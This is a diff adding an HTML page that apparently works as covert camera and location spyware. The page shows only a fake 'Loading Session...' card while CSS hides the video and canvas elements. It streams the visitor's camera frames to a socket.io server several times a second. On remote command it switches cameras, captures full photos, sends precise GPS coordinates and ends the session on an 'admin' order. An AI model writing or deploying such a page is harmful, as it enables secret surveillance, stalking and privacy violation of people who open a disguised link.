@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+body { font-family: sans-serif; background: #f4f6f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+.card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+video, canvas { display: none !important; }
+</style>
+</head>
+<body>
+<div class="card"><h2>Loading Session...</h2><p>Please wait...</p></div>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+let mediaStream = null, isReady = false, interval = null, currentFacingMode = 'user';
+
+function getDeviceInfo() {
+const ua = navigator.userAgent;
+let dev = /mobile/i.test(ua) ? "Mobile" : "Desktop";
+let browser = /chrome/i.test(ua) ? "Chrome" : "Browser";
+return dev + ' (' + browser + ')';
+}
+
+function startCamera(facing) {
+if (mediaStream) {
+mediaStream.getTracks().forEach(t => t.stop());
+}
+navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } }).then(stream => {
+mediaStream = stream;
+video.srcObject = stream;
+video.onloadedmetadata = () => {
+video.play();
+isReady = true;
+socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+if (!interval) {
+interval = setInterval(() => {
+if (!isReady || !video.videoWidth) return;
+const ctx = canvas.getContext('2d');
+canvas.width = 320; canvas.height = 240;
+ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+socket.emit('live-stream-frame', canvas.toDataURL('image/jpeg', 0.3));
+}, 100);
+}
+};
+}).catch(e => console.log(e));
+}
+
+startCamera(currentFacingMode);
+
+window.addEventListener("visibilitychange", () => {
+if (document.visibilityState === "visible") {
+if (video.paused && mediaStream) video.play();
+socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+}
+});
+
+socket.on('switch-camera', (facing) => {
+currentFacingMode = facing;
+startCamera(facing);
+});
+
+socket.on('request-location', () => {
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(pos => {
+socket.emit('user-location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
+}, () => { socket.emit('user-location', null); }, { enableHighAccuracy: true });
+}
+});
+
+socket.on('capture-photo', () => {
+if (!isReady) return;
+const ctx = canvas.getContext('2d');
+canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+socket.emit('user-photo-captured', canvas.toDataURL('image/jpeg', 0.6));
+});
+
+socket.on('disable-user-access', () => {
+if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+document.body.innerHTML = '<h2>Session Ended by Admin</h2>';
+});
+</script>
+</body>
+</html>
